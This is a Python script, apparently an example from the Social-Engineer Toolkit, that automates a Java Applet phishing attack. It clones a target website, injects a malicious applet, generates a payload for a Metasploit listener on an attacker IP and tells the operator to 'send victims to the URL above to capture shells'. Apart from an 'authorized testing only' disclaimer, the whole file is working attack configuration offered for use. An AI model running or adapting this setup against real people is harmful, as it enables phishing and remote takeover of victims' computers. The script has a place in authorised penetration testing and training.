#!/usr/bin/env python3
"""
Example: Java Applet Attack
Social-Engineer Toolkit (SET)

This example demonstrates how to programmatically configure
and launch a Java Applet attack using SET's APIs.

DISCLAIMER: For authorized testing only!
"""

from src.core.setcore import *
import sys
import os

def setup_java_applet_attack():
    """
    Configure and setup a Java Applet attack
    """
    
    # Configuration
    target_website = "https://www.example.com"
    attacker_ip = "192.168.1.100"
    listener_port = "443"
    
    print_status("Starting Java Applet Attack Configuration")
    print_status(f"Target Website: {target_website}")
    print_status(f"Attacker IP: {attacker_ip}")
    print_status(f"Listener Port: {listener_port}")
    
    # Step 1: Configure IP address and port
    print_info("Step 1: Configuring IP address and port")
    update_options(f"IPADDR={attacker_ip}")
    update_options(f"PORT={listener_port}")
    
    # Step 2: Configure site template
    print_info("Step 2: Setting up website cloning configuration")
    site_template_path = userconfigpath + "site.template"
    
    with open(site_template_path, "w") as f:
        f.write("TEMPLATE=CUSTOM\n")
        f.write(f"URL={target_website}\n")
    
    print_status(f"Site template created: {site_template_path}")
    
    # Step 3: Set attack vector to Java Applet
    print_info("Step 3: Setting attack vector to Java Applet")
    attack_vector_path = userconfigpath + "attack_vector"
    
    with open(attack_vector_path, "w") as f:
        f.write("java")
    
    print_status("Attack vector set to: java")
    
    # Step 4: Clone the website
    print_info("Step 4: Cloning target website")
    print_warning("This will download the website and inject the Java Applet")
    
    try:
        # Import the cloner module
        sys.path.append(definepath())
        import src.webattack.web_clone.cloner
        
        # Check if cloning was successful
        if os.path.isfile(userconfigpath + "cloner.failed"):
            print_error("Website cloning failed!")
            print_error("Check your internet connection and target URL")
            return False
        
        print_status("Website cloned successfully")
        
    except Exception as e:
        print_error(f"Error during cloning: {str(e)}")
        log(e)
        return False
    
    # Step 5: Generate payload
    print_info("Step 5: Generating payload")
    
    try:
        # Set payload generation to regular mode
        with open(userconfigpath + "payloadgen", "w") as f:
            f.write("payloadgen=regular")
        
        # Import payload generator
        sys.path.append(definepath() + "/src/core/payloadgen")
        import create_payloads
        
        print_status("Payload generated successfully")
        
    except Exception as e:
        print_error(f"Error during payload generation: {str(e)}")
        log(e)
        return False
    
    # Step 6: Display success message
    print_status("="*60)
    print_status("Java Applet Attack Configured Successfully!")
    print_status("="*60)
    print_info(f"Malicious site available at: http://{attacker_ip}")
    print_info(f"Metasploit listener on port: {listener_port}")
    print_warning("Send victims to the URL above to capture shells")
    print_status("="*60)
    
    return True

def main():
    """
    Main function
    """
    # Check if running as root on POSIX systems
    if check_os() == "posix":
        if os.geteuid() != 0:
            print_error("This script must be run as root on Linux/Unix systems")
            sys.exit(1)
    
    # Display banner
    print_status("Java Applet Attack Example")
    print_status("Social-Engineer Toolkit (SET)")
    print_warning("For authorized testing only!")
    print("")
    
    # Confirm with user
    response = yesno_prompt(["0"], "Do you want to proceed with the attack configuration? [yes|no]")
    
    if response == "YES":
        success = setup_java_applet_attack()
        
        if success:
            print_status("Configuration complete!")
            print_info("You can now start the web server to begin the attack")
            print_info("Metasploit listener configuration saved to:")
            print_info(f"  {userconfigpath}meta_config")
            print_info("Start listener with: msfconsole -r {userconfigpath}meta_config")
        else:
            print_error("Configuration failed!")
            
    else:
        print_info("Attack configuration cancelled by user")
    
    # Cleanup
    return_continue()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_warning("\nOperation cancelled by user")
        cleanup_routine()
        sys.exit(0)
    except Exception as e:
        print_error(f"Unexpected error: {str(e)}")
        log(e)
        cleanup_routine()
        sys.exit(1)
